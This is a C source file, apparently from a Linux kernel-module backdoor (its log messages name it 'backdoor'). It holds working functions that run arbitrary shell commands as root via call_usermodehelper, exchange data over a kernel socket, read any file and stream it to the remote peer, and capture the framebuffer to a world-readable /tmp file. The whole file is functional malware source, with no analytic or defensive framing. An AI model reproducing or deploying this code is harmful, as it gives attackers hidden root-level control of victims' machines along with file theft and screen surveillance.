#include "functions.h"

/*
    Function that executes the shell command and
    redirects the command output to a temporary file.
*/
int execute_shell_command(char *cmd) {
    // Configure the shell and the environment
    char *argv[] = {"/bin/bash", "-c", (char *)cmd, NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    int ret;
    
    // Redirect the command output
    strcat(cmd, " > /tmp/output.txt");
    
    printk(KERN_INFO "command: %s", cmd);

    // Function that executes the command in the shell
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        printk(KERN_ERR "backdoor: Error executing usermodehelper: %d\n", ret);
        return ret;
    } else {
        printk(KERN_INFO "backdoor: Successfully executed usermodehelper\n");
    }

    return 0;
}
/*
    Send the response back to the socket connection.
*/
int send_message(struct socket *sock, const char *message) {
    struct kvec vec;
    struct msghdr msg;
    int ret;

    // Configure the message struct
    vec.iov_base = (void *)message;
    vec.iov_len = strlen(message) + 1;
    // Set the message memory
    memset(&msg, 0, sizeof(msg));

    // Send the message
    ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
    if (ret <= 0) {
        printk(KERN_ERR "backdoor: error sending message\n");
        return ret;
    }

    return 1;
}
/*
    Receive the message from the socket connection.
*/
int receive_message(struct socket *sock, char *buffer, int buffer_size) {
    struct kvec vec;
    struct msghdr msg;
    int ret;

    // Set the buffer memory
    memset(buffer, 0, buffer_size);
    // Configure the message struct
    vec.iov_base = buffer;
    vec.iov_len = buffer_size;
    // Set the message memory
    memset(&msg, 0, sizeof(msg));

    // Receives the message and puts it in the buffer
    ret = kernel_recvmsg(sock, &msg, &vec, 1, buffer_size, 0);
    if (ret <= 0) {
        printk(KERN_ERR "backdoor: error receiving message\n");
        return ret;
    }

    return 1;
}
/*
    Function that reads a file and sends its contents to the socket connection.
*/
int read_file(struct socket *sock, char *filename) {
	char buffer[BUFFER_SIZE];
    struct file *file;
    loff_t pos = 0;
    int ret;
    loff_t file_size;
	
	memset(buffer, 0, BUFFER_SIZE);
    // Open the file
    file = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Error opening file %s\n", filename);
        return -ENOENT;
    }
    
    // Get the file size
	file_size = vfs_llseek(file, 0, SEEK_END);
    
    // Read the file
    while (pos < file_size) {
    	kernel_read(file, buffer, BUFFER_SIZE-1, &pos);
        // Send message
        ret = send_message(sock, buffer);
        memset(buffer, 0, BUFFER_SIZE);
        if (ret <= 0) {
            // Close file
            filp_close(file, NULL);
            return 0;
        }
    }
    // Close file
    filp_close(file, NULL);
    
    ret = send_message(sock, "END\n");

    return 1;
}

/*
	Function to take a screenshot with framebuffer.
	Dont work with graphic interfaces.
*/

int screenshot_ppm(void) {
	struct fb_info *info;
	void *screen_base;
	void *buf;
	long screen_size;
    struct file *file;
    struct file *outfile;
    char header[18];
    loff_t pos;
    u32 *pixel;
    u8 rgb[3];
    int x, y;    
    
    file = filp_open("/dev/fb0", O_RDONLY, 0);
    if (IS_ERR(file)) {
        printk(KERN_ALERT "filp_open error\n");
        return -1;
    }

    info = file->private_data;
    screen_base = info->screen_base;
    screen_size = info->screen_size;

    // Now screen_base points to the start of the video memory and
    // screen_size contains the size of the video memory.
    // You can copy the contents of the video memory to a buffer.

    buf = kmalloc(screen_size, GFP_KERNEL);
    if (!buf) {
        printk(KERN_ALERT "kmalloc error\n");
        filp_close(file, 0);
        return -1;
    }

    memcpy(buf, screen_base, screen_size);

    // Now buf contains a snapshot of the screen.
    // You can write this data to an image file.
    // The exact procedure depends on the image format you want to use.
    // For simplicity, let's assume you're writing a raw PPM file.
    

    outfile = filp_open("/tmp/screenshot.ppm", O_WRONLY | O_CREAT, 0666);
    if (IS_ERR(outfile)) {
        printk(KERN_ALERT "filp_open error\n");
        kfree(buf);
        filp_close(file, 0);
        return -1;
    }
	
	pos = 0;
    sprintf(header, "P6\n%d %d\n255\n", info->var.xres, info->var.yres);
    if (kernel_write(outfile, header, strlen(header), &pos) < 0) {
        printk(KERN_ERR "kernel_write error\n");
        kfree(buf);
        filp_close(outfile, 0);
        filp_close(file, 0);
        return -1;
    }
    pos = strlen(header);
    pixel = (u32 *)buf;
    for (y = 0; y < info->var.yres; y++) {
        for (x = 0; x < info->var.xres; x++) {
            u32 color = *pixel++;
            u8 r, g, b;
            if (info->var.red.length == 8)
                r = (color >> info->var.red.offset) & 0xFF;
            else
                r = (color >> info->var.red.offset) & ((1 << info->var.red.length) - 1);
            if (info->var.green.length == 8)
                g = (color >> info->var.green.offset) & 0xFF;
            else
                g = (color >> info->var.green.offset) & ((1 << info->var.green.length) - 1);
            if (info->var.blue.length == 8)
                b = (color >> info->var.blue.offset) & 0xFF;
            else
                b = (color >> info->var.blue.offset) & ((1 << info->var.blue.length) - 1);
            rgb[0] = r; rgb[1] = g; rgb[2] = b;
            if (kernel_write(outfile, rgb, 3, &pos) < 0) {
                printk(KERN_ERR "kernel_write error\n");
                kfree(buf);
                filp_close(outfile, 0);
                filp_close(file, 0);
                return -1;
            }
        }
    }

    filp_close(outfile, 0);
    kfree(buf);
    filp_close(file, 0);

    return 0;
}
